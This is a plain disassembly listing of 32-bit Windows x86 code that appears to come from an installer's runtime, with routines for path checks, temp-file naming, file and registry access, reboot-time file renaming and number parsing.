  405ed9:	66 83 3b 3a          	cmpw   $0x3a,(%ebx)
  405edd:	75 0c                	jne    0x405eeb
  405edf:	66 83 7b 02 5c       	cmpw   $0x5c,0x2(%ebx)
  405ee4:	75 05                	jne    0x405eeb
  405ee6:	50                   	push   %eax
  405ee7:	ff d6                	call   *%esi
  405ee9:	eb 28                	jmp    0x405f13
  405eeb:	66 83 f9 5c          	cmp    $0x5c,%cx
  405eef:	75 20                	jne    0x405f11
  405ef1:	66 39 4f 02          	cmp    %cx,0x2(%edi)
  405ef5:	75 1a                	jne    0x405f11
  405ef7:	6a 02                	push   $0x2
  405ef9:	5e                   	pop    %esi
  405efa:	6a 5c                	push   $0x5c
  405efc:	50                   	push   %eax
  405efd:	4e                   	dec    %esi
  405efe:	e8 3b ff ff ff       	call   0x405e3e
  405f03:	66 83 38 00          	cmpw   $0x0,(%eax)
  405f07:	74 08                	je     0x405f11
  405f09:	40                   	inc    %eax
  405f0a:	40                   	inc    %eax
  405f0b:	85 f6                	test   %esi,%esi
  405f0d:	75 eb                	jne    0x405efa
  405f0f:	eb 02                	jmp    0x405f13
  405f11:	33 c0                	xor    %eax,%eax
  405f13:	5f                   	pop    %edi
  405f14:	5e                   	pop    %esi
  405f15:	5b                   	pop    %ebx
  405f16:	c2 04 00             	ret    $0x4
  405f19:	56                   	push   %esi
  405f1a:	57                   	push   %edi
  405f1b:	ff 74 24 0c          	push   0xc(%esp)
  405f1f:	be 50 5f 42 00       	mov    $0x425f50,%esi
  405f24:	56                   	push   %esi
  405f25:	e8 12 06 00 00       	call   0x40653c
  405f2a:	56                   	push   %esi
  405f2b:	e8 8c ff ff ff       	call   0x405ebc
  405f30:	8b f8                	mov    %eax,%edi
  405f32:	85 ff                	test   %edi,%edi
  405f34:	75 04                	jne    0x405f3a
  405f36:	33 c0                	xor    %eax,%eax
  405f38:	eb 58                	jmp    0x405f92
  405f3a:	57                   	push   %edi
  405f3b:	e8 ab 08 00 00       	call   0x4067eb
  405f40:	f6 05 7c a2 42 00 80 	testb  $0x80,0x42a27c
  405f47:	74 0e                	je     0x405f57
  405f49:	66 8b 07             	mov    (%edi),%ax
  405f4c:	66 85 c0             	test   %ax,%ax
  405f4f:	74 e5                	je     0x405f36
  405f51:	66 3d 5c 00          	cmp    $0x5c,%ax
  405f55:	74 df                	je     0x405f36
  405f57:	2b fe                	sub    %esi,%edi
  405f59:	d1 ff                	sar    $1,%edi
  405f5b:	eb 14                	jmp    0x405f71
  405f5d:	e8 38 09 00 00       	call   0x40689a
  405f62:	85 c0                	test   %eax,%eax
  405f64:	74 05                	je     0x405f6b
  405f66:	f6 00 10             	testb  $0x10,(%eax)
  405f69:	74 cb                	je     0x405f36
  405f6b:	56                   	push   %esi
  405f6c:	e8 ec fe ff ff       	call   0x405e5d
  405f71:	56                   	push   %esi
  405f72:	e8 db 05 00 00       	call   0x406552
  405f77:	3b c7                	cmp    %edi,%eax
  405f79:	56                   	push   %esi
  405f7a:	7f e1                	jg     0x405f5d
  405f7c:	e8 90 fe ff ff       	call   0x405e11
  405f81:	56                   	push   %esi
  405f82:	ff 15 04 81 40 00    	call   *0x408104
  405f88:	33 c9                	xor    %ecx,%ecx
  405f8a:	83 f8 ff             	cmp    $0xffffffff,%eax
  405f8d:	0f 95 c1             	setne  %cl
  405f90:	8b c1                	mov    %ecx,%eax
  405f92:	5f                   	pop    %edi
  405f93:	5e                   	pop    %esi
  405f94:	c2 04 00             	ret    $0x4
  405f97:	55                   	push   %ebp
  405f98:	8b ec                	mov    %esp,%ebp
  405f9a:	51                   	push   %ecx
  405f9b:	53                   	push   %ebx
  405f9c:	56                   	push   %esi
  405f9d:	57                   	push   %edi
  405f9e:	8b 3d 54 81 40 00    	mov    0x408154,%edi
  405fa4:	ff 75 0c             	push   0xc(%ebp)
  405fa7:	ff d7                	call   *%edi
  405fa9:	8b 75 08             	mov    0x8(%ebp),%esi
  405fac:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405faf:	eb 27                	jmp    0x405fd8
  405fb1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405fb4:	ff 75 0c             	push   0xc(%ebp)
  405fb7:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  405fba:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  405fbe:	56                   	push   %esi
  405fbf:	ff 15 98 80 40 00    	call   *0x408098
  405fc5:	85 c0                	test   %eax,%eax
  405fc7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405fca:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  405fcd:	74 1a                	je     0x405fe9
  405fcf:	56                   	push   %esi
  405fd0:	ff 15 ac 81 40 00    	call   *0x4081ac
  405fd6:	8b f0                	mov    %eax,%esi
  405fd8:	56                   	push   %esi
  405fd9:	ff d7                	call   *%edi
  405fdb:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  405fde:	7d d1                	jge    0x405fb1
  405fe0:	33 c0                	xor    %eax,%eax
  405fe2:	5f                   	pop    %edi
  405fe3:	5e                   	pop    %esi
  405fe4:	5b                   	pop    %ebx
  405fe5:	c9                   	leave
  405fe6:	c2 08 00             	ret    $0x8
  405fe9:	8b c6                	mov    %esi,%eax
  405feb:	eb f5                	jmp    0x405fe2
  405fed:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405ff1:	56                   	push   %esi
  405ff2:	8b 74 24 10          	mov    0x10(%esp),%esi
  405ff6:	85 f6                	test   %esi,%esi
  405ff8:	76 0f                	jbe    0x406009
  405ffa:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405ffe:	2b c1                	sub    %ecx,%eax
  406000:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  406003:	88 11                	mov    %dl,(%ecx)
  406005:	41                   	inc    %ecx
  406006:	4e                   	dec    %esi
  406007:	75 f7                	jne    0x406000
  406009:	5e                   	pop    %esi
  40600a:	c2 0c 00             	ret    $0xc
  40600d:	56                   	push   %esi
  40600e:	ff 74 24 08          	push   0x8(%esp)
  406012:	ff 15 04 81 40 00    	call   *0x408104
  406018:	8b f0                	mov    %eax,%esi
  40601a:	83 fe ff             	cmp    $0xffffffff,%esi
  40601d:	74 0d                	je     0x40602c
  40601f:	24 fe                	and    $0xfe,%al
  406021:	50                   	push   %eax
  406022:	ff 74 24 0c          	push   0xc(%esp)
  406026:	ff 15 00 81 40 00    	call   *0x408100
  40602c:	8b c6                	mov    %esi,%eax
  40602e:	5e                   	pop    %esi
  40602f:	c2 04 00             	ret    $0x4
  406032:	ff 74 24 04          	push   0x4(%esp)
  406036:	ff 15 04 81 40 00    	call   *0x408104
  40603c:	8b c8                	mov    %eax,%ecx
  40603e:	6a 00                	push   $0x0
  406040:	41                   	inc    %ecx
  406041:	f7 d9                	neg    %ecx
  406043:	1b c9                	sbb    %ecx,%ecx
  406045:	23 c8                	and    %eax,%ecx
  406047:	51                   	push   %ecx
  406048:	ff 74 24 14          	push   0x14(%esp)
  40604c:	6a 00                	push   $0x0
  40604e:	6a 01                	push   $0x1
  406050:	ff 74 24 1c          	push   0x1c(%esp)
  406054:	ff 74 24 1c          	push   0x1c(%esp)
  406058:	ff 15 f4 80 40 00    	call   *0x4080f4
  40605e:	c2 0c 00             	ret    $0xc
  406061:	55                   	push   %ebp
  406062:	8b ec                	mov    %esp,%ebp
  406064:	51                   	push   %ecx
  406065:	51                   	push   %ecx
  406066:	56                   	push   %esi
  406067:	8b 75 08             	mov    0x8(%ebp),%esi
  40606a:	57                   	push   %edi
  40606b:	6a 64                	push   $0x64
  40606d:	5f                   	pop    %edi
  40606e:	a1 a8 a5 40 00       	mov    0x40a5a8,%eax
  406073:	4f                   	dec    %edi
  406074:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406077:	a1 ac a5 40 00       	mov    0x40a5ac,%eax
  40607c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40607f:	ff 15 f8 80 40 00    	call   *0x4080f8
  406085:	6a 1a                	push   $0x1a
  406087:	33 d2                	xor    %edx,%edx
  406089:	59                   	pop    %ecx
  40608a:	f7 f1                	div    %ecx
  40608c:	56                   	push   %esi
  40608d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406090:	6a 00                	push   $0x0
  406092:	50                   	push   %eax
  406093:	ff 75 0c             	push   0xc(%ebp)
  406096:	66 01 55 fc          	add    %dx,-0x4(%ebp)
  40609a:	ff 15 94 80 40 00    	call   *0x408094
  4060a0:	85 c0                	test   %eax,%eax
  4060a2:	75 0d                	jne    0x4060b1
  4060a4:	85 ff                	test   %edi,%edi
  4060a6:	75 c6                	jne    0x40606e
  4060a8:	66 21 3e             	and    %di,(%esi)
  4060ab:	5f                   	pop    %edi
  4060ac:	5e                   	pop    %esi
  4060ad:	c9                   	leave
  4060ae:	c2 08 00             	ret    $0x8
  4060b1:	8b c6                	mov    %esi,%eax
  4060b3:	eb f6                	jmp    0x4060ab
  4060b5:	55                   	push   %ebp
  4060b6:	8b ec                	mov    %esp,%ebp
  4060b8:	56                   	push   %esi
  4060b9:	8b 75 10             	mov    0x10(%ebp),%esi
  4060bc:	8d 45 10             	lea    0x10(%ebp),%eax
  4060bf:	6a 00                	push   $0x0
  4060c1:	50                   	push   %eax
  4060c2:	56                   	push   %esi
  4060c3:	ff 75 0c             	push   0xc(%ebp)
  4060c6:	ff 75 08             	push   0x8(%ebp)
  4060c9:	ff 15 5c 81 40 00    	call   *0x40815c
  4060cf:	85 c0                	test   %eax,%eax
  4060d1:	74 0a                	je     0x4060dd
  4060d3:	3b 75 10             	cmp    0x10(%ebp),%esi
  4060d6:	75 05                	jne    0x4060dd
  4060d8:	33 c0                	xor    %eax,%eax
  4060da:	40                   	inc    %eax
  4060db:	eb 02                	jmp    0x4060df
  4060dd:	33 c0                	xor    %eax,%eax
  4060df:	5e                   	pop    %esi
  4060e0:	5d                   	pop    %ebp
  4060e1:	c2 0c 00             	ret    $0xc
  4060e4:	55                   	push   %ebp
  4060e5:	8b ec                	mov    %esp,%ebp
  4060e7:	56                   	push   %esi
  4060e8:	8b 75 10             	mov    0x10(%ebp),%esi
  4060eb:	8d 45 10             	lea    0x10(%ebp),%eax
  4060ee:	6a 00                	push   $0x0
  4060f0:	50                   	push   %eax
  4060f1:	56                   	push   %esi
  4060f2:	ff 75 0c             	push   0xc(%ebp)
  4060f5:	ff 75 08             	push   0x8(%ebp)
  4060f8:	ff 15 90 80 40 00    	call   *0x408090
  4060fe:	85 c0                	test   %eax,%eax
  406100:	74 0a                	je     0x40610c
  406102:	3b 75 10             	cmp    0x10(%ebp),%esi
  406105:	75 05                	jne    0x40610c
  406107:	33 c0                	xor    %eax,%eax
  406109:	40                   	inc    %eax
  40610a:	eb 02                	jmp    0x40610e
  40610c:	33 c0                	xor    %eax,%eax
  40610e:	5e                   	pop    %esi
  40610f:	5d                   	pop    %ebp
  406110:	c2 0c 00             	ret    $0xc
  406113:	55                   	push   %ebp
  406114:	8b ec                	mov    %esp,%ebp
  406116:	53                   	push   %ebx
  406117:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40611a:	56                   	push   %esi
  40611b:	8b 35 60 81 40 00    	mov    0x408160,%esi
  406121:	57                   	push   %edi
  406122:	33 ff                	xor    %edi,%edi
  406124:	6a 01                	push   $0x1
  406126:	57                   	push   %edi
  406127:	57                   	push   %edi
  406128:	53                   	push   %ebx
  406129:	ff d6                	call   *%esi
  40612b:	85 c0                	test   %eax,%eax
  40612d:	75 4f                	jne    0x40617e
  40612f:	8d 45 0a             	lea    0xa(%ebp),%eax
  406132:	6a 02                	push   $0x2
  406134:	50                   	push   %eax
  406135:	53                   	push   %ebx
  406136:	e8 7a ff ff ff       	call   0x4060b5
  40613b:	85 c0                	test   %eax,%eax
  40613d:	74 0c                	je     0x40614b
  40613f:	66 81 7d 0a ff fe    	cmpw   $0xfeff,0xa(%ebp)
  406145:	75 04                	jne    0x40614b
  406147:	33 c0                	xor    %eax,%eax
  406149:	eb 36                	jmp    0x406181
  40614b:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  40614e:	74 28                	je     0x406178
  406150:	6a 01                	push   $0x1
  406152:	57                   	push   %edi
  406153:	57                   	push   %edi
  406154:	53                   	push   %ebx
  406155:	ff d6                	call   *%esi
  406157:	85 c0                	test   %eax,%eax
  406159:	75 1d                	jne    0x406178
  40615b:	6a 02                	push   $0x2
  40615d:	68 1c 84 40 00       	push   $0x40841c
  406162:	53                   	push   %ebx
  406163:	e8 7c ff ff ff       	call   0x4060e4
  406168:	f7 d8                	neg    %eax
  40616a:	1b c0                	sbb    %eax,%eax
  40616c:	25 fb bf ff 7f       	and    $0x7fffbffb,%eax
  406171:	05 05 40 00 80       	add    $0x80004005,%eax
  406176:	eb 09                	jmp    0x406181
  406178:	57                   	push   %edi
  406179:	57                   	push   %edi
  40617a:	57                   	push   %edi
  40617b:	53                   	push   %ebx
  40617c:	ff d6                	call   *%esi
  40617e:	33 c0                	xor    %eax,%eax
  406180:	40                   	inc    %eax
  406181:	5f                   	pop    %edi
  406182:	5e                   	pop    %esi
  406183:	5b                   	pop    %ebx
  406184:	5d                   	pop    %ebp
  406185:	c2 08 00             	ret    $0x8
  406188:	53                   	push   %ebx
  406189:	8b 1d 14 81 40 00    	mov    0x408114,%ebx
  40618f:	55                   	push   %ebp
  406190:	56                   	push   %esi
  406191:	8b 74 24 14          	mov    0x14(%esp),%esi
  406195:	57                   	push   %edi
  406196:	85 f6                	test   %esi,%esi
  406198:	c7 05 e8 6d 42 00 4e 	movl   $0x55004e,0x426de8
  40619f:	00 55 00 
  4061a2:	c7 05 ec 6d 42 00 4c 	movl   $0x4c,0x426dec
  4061a9:	00 00 00 
  4061ac:	bf 00 04 00 00       	mov    $0x400,%edi
  4061b1:	bd e8 6d 42 00       	mov    $0x426de8,%ebp
  4061b6:	74 26                	je     0x4061de
  4061b8:	6a 01                	push   $0x1
  4061ba:	6a 00                	push   $0x0
  4061bc:	56                   	push   %esi
  4061bd:	e8 70 fe ff ff       	call   0x406032
  4061c2:	50                   	push   %eax
  4061c3:	ff 15 24 81 40 00    	call   *0x408124
  4061c9:	57                   	push   %edi
  4061ca:	55                   	push   %ebp
  4061cb:	56                   	push   %esi
  4061cc:	ff d3                	call   *%ebx
  4061ce:	85 c0                	test   %eax,%eax
  4061d0:	0f 84 27 01 00 00    	je     0x4062fd
  4061d6:	3b c7                	cmp    %edi,%eax
  4061d8:	0f 8f 1f 01 00 00    	jg     0x4062fd
  4061de:	be e8 75 42 00       	mov    $0x4275e8,%esi
  4061e3:	57                   	push   %edi
  4061e4:	56                   	push   %esi
  4061e5:	ff 74 24 1c          	push   0x1c(%esp)
  4061e9:	ff d3                	call   *%ebx
  4061eb:	85 c0                	test   %eax,%eax
  4061ed:	0f 84 0a 01 00 00    	je     0x4062fd
  4061f3:	3b c7                	cmp    %edi,%eax
  4061f5:	0f 8f 02 01 00 00    	jg     0x4062fd
  4061fb:	56                   	push   %esi
  4061fc:	55                   	push   %ebp
  4061fd:	68 c0 a5 40 00       	push   $0x40a5c0
  406202:	68 e8 69 42 00       	push   $0x4269e8
  406207:	ff 15 a8 81 40 00    	call   *0x4081a8
  40620d:	8b d8                	mov    %eax,%ebx
  40620f:	a1 74 a2 42 00       	mov    0x42a274,%eax
  406214:	83 c4 10             	add    $0x10,%esp
  406217:	ff b0 28 01 00 00    	push   0x128(%eax)
  40621d:	56                   	push   %esi
  40621e:	e8 56 03 00 00       	call   0x406579
  406223:	6a 04                	push   $0x4
  406225:	68 00 00 00 c0       	push   $0xc0000000
  40622a:	56                   	push   %esi
  40622b:	e8 02 fe ff ff       	call   0x406032
  406230:	8b e8                	mov    %eax,%ebp
  406232:	83 fd ff             	cmp    $0xffffffff,%ebp
  406235:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  406239:	0f 84 be 00 00 00    	je     0x4062fd
  40623f:	6a 00                	push   $0x0
  406241:	55                   	push   %ebp
  406242:	ff 15 f0 80 40 00    	call   *0x4080f0
  406248:	8b f8                	mov    %eax,%edi
  40624a:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  40624e:	50                   	push   %eax
  40624f:	6a 40                	push   $0x40
  406251:	ff 15 38 81 40 00    	call   *0x408138
  406257:	8b f0                	mov    %eax,%esi
  406259:	85 f6                	test   %esi,%esi
  40625b:	0f 84 95 00 00 00    	je     0x4062f6
  406261:	57                   	push   %edi
  406262:	56                   	push   %esi
  406263:	55                   	push   %ebp
  406264:	e8 4c fe ff ff       	call   0x4060b5
  406269:	85 c0                	test   %eax,%eax
  40626b:	0f 84 85 00 00 00    	je     0x4062f6
  406271:	68 b4 a5 40 00       	push   $0x40a5b4
  406276:	56                   	push   %esi
  406277:	e8 1b fd ff ff       	call   0x405f97
  40627c:	85 c0                	test   %eax,%eax
  40627e:	75 14                	jne    0x406294
  406280:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  406283:	68 b4 a5 40 00       	push   $0x40a5b4
  406288:	50                   	push   %eax
  406289:	ff 15 8c 80 40 00    	call   *0x40808c
  40628f:	83 c7 0a             	add    $0xa,%edi
  406292:	eb 35                	jmp    0x4062c9
  406294:	83 c0 0a             	add    $0xa,%eax
  406297:	68 b0 a5 40 00       	push   $0x40a5b0
  40629c:	50                   	push   %eax
  40629d:	e8 f5 fc ff ff       	call   0x405f97
  4062a2:	8b e8                	mov    %eax,%ebp
  4062a4:	85 ed                	test   %ebp,%ebp
  4062a6:	74 1d                	je     0x4062c5
  4062a8:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  4062ab:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  4062ae:	eb 06                	jmp    0x4062b6
  4062b0:	8a 11                	mov    (%ecx),%dl
  4062b2:	88 10                	mov    %dl,(%eax)
  4062b4:	48                   	dec    %eax
  4062b5:	49                   	dec    %ecx
  4062b6:	3b cd                	cmp    %ebp,%ecx
  4062b8:	77 f6                	ja     0x4062b0
  4062ba:	2b ee                	sub    %esi,%ebp
  4062bc:	45                   	inc    %ebp
  4062bd:	8b c5                	mov    %ebp,%eax
  4062bf:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4062c3:	eb 06                	jmp    0x4062cb
  4062c5:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4062c9:	8b c7                	mov    %edi,%eax
  4062cb:	53                   	push   %ebx
  4062cc:	03 c6                	add    %esi,%eax
  4062ce:	68 e8 69 42 00       	push   $0x4269e8
  4062d3:	50                   	push   %eax
  4062d4:	e8 14 fd ff ff       	call   0x405fed
  4062d9:	33 c0                	xor    %eax,%eax
  4062db:	50                   	push   %eax
  4062dc:	50                   	push   %eax
  4062dd:	50                   	push   %eax
  4062de:	55                   	push   %ebp
  4062df:	ff 15 60 81 40 00    	call   *0x408160
  4062e5:	03 fb                	add    %ebx,%edi
  4062e7:	57                   	push   %edi
  4062e8:	56                   	push   %esi
  4062e9:	55                   	push   %ebp
  4062ea:	e8 f5 fd ff ff       	call   0x4060e4
  4062ef:	56                   	push   %esi
  4062f0:	ff 15 34 81 40 00    	call   *0x408134
  4062f6:	55                   	push   %ebp
  4062f7:	ff 15 24 81 40 00    	call   *0x408124
  4062fd:	5f                   	pop    %edi
  4062fe:	5e                   	pop    %esi
  4062ff:	5d                   	pop    %ebp
  406300:	5b                   	pop    %ebx
  406301:	c3                   	ret
  406302:	6a 05                	push   $0x5
  406304:	ff 74 24 0c          	push   0xc(%esp)
  406308:	ff 74 24 0c          	push   0xc(%esp)
  40630c:	ff 15 44 81 40 00    	call   *0x408144
  406312:	85 c0                	test   %eax,%eax
  406314:	75 0f                	jne    0x406325
  406316:	ff 74 24 08          	push   0x8(%esp)
  40631a:	ff 74 24 08          	push   0x8(%esp)
  40631e:	e8 65 fe ff ff       	call   0x406188
  406323:	59                   	pop    %ecx
  406324:	59                   	pop    %ecx
  406325:	ff 05 10 a3 42 00    	incl   0x42a310
  40632b:	c2 08 00             	ret    $0x8
  40632e:	8b 15 6c a2 42 00    	mov    0x42a26c,%edx
  406334:	53                   	push   %ebx
  406335:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  406339:	57                   	push   %edi
  40633a:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40633e:	f7 d2                	not    %edx
  406340:	8b 07                	mov    (%edi),%eax
  406342:	c1 ea 16             	shr    $0x16,%edx
  406345:	81 e2 00 01 00 00    	and    $0x100,%edx
  40634b:	a8 20                	test   $0x20,%al
  40634d:	74 34                	je     0x406383
  40634f:	f7 c3 00 00 00 60    	test   $0x60000000,%ebx
  406355:	74 2c                	je     0x406383
  406357:	8b cb                	mov    %ebx,%ecx
  406359:	56                   	push   %esi
  40635a:	c1 e9 15             	shr    $0x15,%ecx
  40635d:	be 00 03 00 00       	mov    $0x300,%esi
  406362:	23 ce                	and    %esi,%ecx
  406364:	3b ce                	cmp    %esi,%ecx
  406366:	5e                   	pop    %esi
  406367:	75 0a                	jne    0x406373
  406369:	8b ca                	mov    %edx,%ecx
  40636b:	f7 d1                	not    %ecx
  40636d:	23 0d 30 a3 42 00    	and    0x42a330,%ecx
  406373:	80 e4 fe             	and    $0xfe,%ah
  406376:	0b c1                	or     %ecx,%eax
  406378:	80 e4 fd             	and    $0xfd,%ah
  40637b:	81 e3 ff ff ff 9f    	and    $0x9fffffff,%ebx
  406381:	eb 0d                	jmp    0x406390
  406383:	a9 00 00 10 00       	test   $0x100000,%eax
  406388:	74 06                	je     0x406390
  40638a:	0b 05 30 a3 42 00    	or     0x42a330,%eax
  406390:	8b c8                	mov    %eax,%ecx
  406392:	23 c2                	and    %edx,%eax
  406394:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  40639a:	f7 d8                	neg    %eax
  40639c:	1b c0                	sbb    %eax,%eax
  40639e:	89 0f                	mov    %ecx,(%edi)
  4063a0:	f7 d0                	not    %eax
  4063a2:	23 c3                	and    %ebx,%eax
  4063a4:	5f                   	pop    %edi
  4063a5:	5b                   	pop    %ebx
  4063a6:	c2 08 00             	ret    $0x8
  4063a9:	55                   	push   %ebp
  4063aa:	8b ec                	mov    %esp,%ebp
  4063ac:	8d 45 10             	lea    0x10(%ebp),%eax
  4063af:	50                   	push   %eax
  4063b0:	ff 75 08             	push   0x8(%ebp)
  4063b3:	e8 76 ff ff ff       	call   0x40632e
  4063b8:	85 c0                	test   %eax,%eax
  4063ba:	75 05                	jne    0x4063c1
  4063bc:	6a 06                	push   $0x6
  4063be:	58                   	pop    %eax
  4063bf:	eb 12                	jmp    0x4063d3
  4063c1:	ff 75 14             	push   0x14(%ebp)
  4063c4:	ff 75 10             	push   0x10(%ebp)
  4063c7:	6a 00                	push   $0x0
  4063c9:	ff 75 0c             	push   0xc(%ebp)
  4063cc:	50                   	push   %eax
  4063cd:	ff 15 2c 80 40 00    	call   *0x40802c
  4063d3:	5d                   	pop    %ebp
  4063d4:	c2 10 00             	ret    $0x10
  4063d7:	55                   	push   %ebp
  4063d8:	8b ec                	mov    %esp,%ebp
  4063da:	8d 45 10             	lea    0x10(%ebp),%eax
  4063dd:	50                   	push   %eax
  4063de:	ff 75 08             	push   0x8(%ebp)
  4063e1:	e8 48 ff ff ff       	call   0x40632e
  4063e6:	33 c9                	xor    %ecx,%ecx
  4063e8:	3b c1                	cmp    %ecx,%eax
  4063ea:	75 05                	jne    0x4063f1
  4063ec:	6a 06                	push   $0x6
  4063ee:	58                   	pop    %eax
  4063ef:	eb 15                	jmp    0x406406
  4063f1:	51                   	push   %ecx
  4063f2:	ff 75 14             	push   0x14(%ebp)
  4063f5:	51                   	push   %ecx
  4063f6:	ff 75 10             	push   0x10(%ebp)
  4063f9:	51                   	push   %ecx
  4063fa:	51                   	push   %ecx
  4063fb:	51                   	push   %ecx
  4063fc:	ff 75 0c             	push   0xc(%ebp)
  4063ff:	50                   	push   %eax
  406400:	ff 15 00 80 40 00    	call   *0x408000
  406406:	5d                   	pop    %ebp
  406407:	c2 10 00             	ret    $0x10
  40640a:	55                   	push   %ebp
  40640b:	8b ec                	mov    %esp,%ebp
  40640d:	51                   	push   %ecx
  40640e:	8d 45 18             	lea    0x18(%ebp),%eax
  406411:	56                   	push   %esi
  406412:	50                   	push   %eax
  406413:	8b 45 18             	mov    0x18(%ebp),%eax
  406416:	f7 d8                	neg    %eax
  406418:	1b c0                	sbb    %eax,%eax
  40641a:	c7 45 fc 00 08 00 00 	movl   $0x800,-0x4(%ebp)
  406421:	25 00 01 00 00       	and    $0x100,%eax
  406426:	0d 19 00 02 00       	or     $0x20019,%eax
  40642b:	50                   	push   %eax
  40642c:	ff 75 0c             	push   0xc(%ebp)
  40642f:	ff 75 08             	push   0x8(%ebp)
  406432:	e8 72 ff ff ff       	call   0x4063a9
  406437:	8b 75 14             	mov    0x14(%ebp),%esi
  40643a:	85 c0                	test   %eax,%eax
  40643c:	75 3c                	jne    0x40647a
  40643e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406441:	57                   	push   %edi
  406442:	50                   	push   %eax
  406443:	8d 45 0c             	lea    0xc(%ebp),%eax
  406446:	56                   	push   %esi
  406447:	50                   	push   %eax
  406448:	6a 00                	push   $0x0
  40644a:	ff 75 10             	push   0x10(%ebp)
  40644d:	ff 75 18             	push   0x18(%ebp)
  406450:	ff 15 08 80 40 00    	call   *0x408008
  406456:	ff 75 18             	push   0x18(%ebp)
  406459:	8b f8                	mov    %eax,%edi
  40645b:	ff 15 10 80 40 00    	call   *0x408010
  406461:	66 83 a6 fe 07 00 00 	andw   $0x0,0x7fe(%esi)
  406468:	00 
  406469:	85 ff                	test   %edi,%edi
  40646b:	5f                   	pop    %edi
  40646c:	75 0c                	jne    0x40647a
  40646e:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  406472:	74 0a                	je     0x40647e
  406474:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  406478:	74 04                	je     0x40647e
  40647a:	66 83 26 00          	andw   $0x0,(%esi)
  40647e:	5e                   	pop    %esi
  40647f:	c9                   	leave
  406480:	c2 14 00             	ret    $0x14
  406483:	ff 74 24 08          	push   0x8(%esp)
  406487:	68 20 84 40 00       	push   $0x408420
  40648c:	ff 74 24 0c          	push   0xc(%esp)
  406490:	ff 15 54 82 40 00    	call   *0x408254
  406496:	83 c4 0c             	add    $0xc,%esp
  406499:	c2 08 00             	ret    $0x8
  40649c:	55                   	push   %ebp
  40649d:	8b ec                	mov    %esp,%ebp
  40649f:	51                   	push   %ecx
  4064a0:	51                   	push   %ecx
  4064a1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4064a4:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4064a8:	53                   	push   %ebx
  4064a9:	56                   	push   %esi
  4064aa:	66 83 39 2d          	cmpw   $0x2d,(%ecx)
  4064ae:	6a 0a                	push   $0xa
  4064b0:	58                   	pop    %eax
  4064b1:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4064b8:	6a 39                	push   $0x39
  4064ba:	5b                   	pop    %ebx
  4064bb:	75 06                	jne    0x4064c3
  4064bd:	41                   	inc    %ecx
  4064be:	41                   	inc    %ecx
  4064bf:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  4064c3:	66 83 39 30          	cmpw   $0x30,(%ecx)
  4064c7:	75 27                	jne    0x4064f0
  4064c9:	41                   	inc    %ecx
  4064ca:	41                   	inc    %ecx
  4064cb:	66 8b 11             	mov    (%ecx),%dx
  4064ce:	66 83 fa 30          	cmp    $0x30,%dx
  4064d2:	72 0c                	jb     0x4064e0
  4064d4:	66 83 fa 37          	cmp    $0x37,%dx
  4064d8:	77 06                	ja     0x4064e0
  4064da:	6a 08                	push   $0x8
  4064dc:	58                   	pop    %eax
  4064dd:	6a 37                	push   $0x37
  4064df:	5b                   	pop    %ebx
  4064e0:	0f b7 d2             	movzwl %dx,%edx
  4064e3:	83 e2 df             	and    $0xffffffdf,%edx
  4064e6:	83 fa 58             	cmp    $0x58,%edx
  4064e9:	75 05                	jne    0x4064f0
  4064eb:	6a 10                	push   $0x10
  4064ed:	41                   	inc    %ecx
  4064ee:	58                   	pop    %eax
  4064ef:	41                   	inc    %ecx
  4064f0:	0f b7 11             	movzwl (%ecx),%edx
  4064f3:	41                   	inc    %ecx
  4064f4:	41                   	inc    %ecx
  4064f5:	83 fa 30             	cmp    $0x30,%edx
  4064f8:	7c 0c                	jl     0x406506
  4064fa:	0f b7 f3             	movzwl %bx,%esi
  4064fd:	3b d6                	cmp    %esi,%edx
  4064ff:	7f 05                	jg     0x406506
  406501:	83 ea 30             	sub    $0x30,%edx
  406504:	eb 1b                	jmp    0x406521
  406506:	66 3d 10 00          	cmp    $0x10,%ax
  40650a:	75 23                	jne    0x40652f
  40650c:	8b f2                	mov    %edx,%esi
  40650e:	83 e6 df             	and    $0xffffffdf,%esi
  406511:	83 fe 41             	cmp    $0x41,%esi
  406514:	7c 19                	jl     0x40652f
  406516:	83 fe 46             	cmp    $0x46,%esi
  406519:	7f 14                	jg     0x40652f
  40651b:	83 e2 07             	and    $0x7,%edx
  40651e:	83 c2 09             	add    $0x9,%edx
  406521:	0f b7 f0             	movzwl %ax,%esi
  406524:	0f af 75 fc          	imul   -0x4(%ebp),%esi
  406528:	03 f2                	add    %edx,%esi
  40652a:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40652d:	eb c1                	jmp    0x4064f0
  40652f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406532:	5e                   	pop    %esi
  406533:	0f af 45 fc          	imul   -0x4(%ebp),%eax
  406537:	5b                   	pop    %ebx
  406538:	c9                   	leave
  406539:	c2 04 00             	ret    $0x4
  40653c:	68 00 04 00 00       	push   $0x400
  406541:	ff 74 24 0c          	push   0xc(%esp)
